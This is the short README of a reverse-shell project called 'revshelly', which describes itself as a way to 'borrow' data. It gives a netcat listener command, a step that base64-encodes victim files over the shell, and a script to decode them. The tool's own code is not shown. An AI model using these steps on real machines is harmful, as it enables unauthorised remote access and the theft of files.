revshelly
=========

A reverse shell designed to "borrow" data without using any special client program.

Listen for connections with netcat:

    nc -l -p 8080|tee revshelly.log

Once connected, you can encode files in base 64:

    uu somefile

You can then decode the files with base64_dec.py (you first have to copy the base64 code of each file into a separate text file):

    base64_dec.py infile.txt outfile

As you can probably tell, this is nothing serious, just an experiment.
